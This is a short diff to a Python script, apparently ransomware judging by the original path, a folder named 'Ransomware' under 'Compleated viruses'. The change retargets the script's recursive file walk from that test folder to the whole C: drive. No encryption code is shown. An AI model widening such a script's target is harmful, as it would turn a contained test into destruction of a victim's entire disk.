@@ -3,7 +3,7 @@ import os
 import random
 from easygui import *
 
-path = r"C:\Users\sakth\OneDrive\Desktop\python projects\Compleated viruses\Ransomware\Important"
+path = r"C:\"
 
 file = os.walk(path, topdown=False)
 
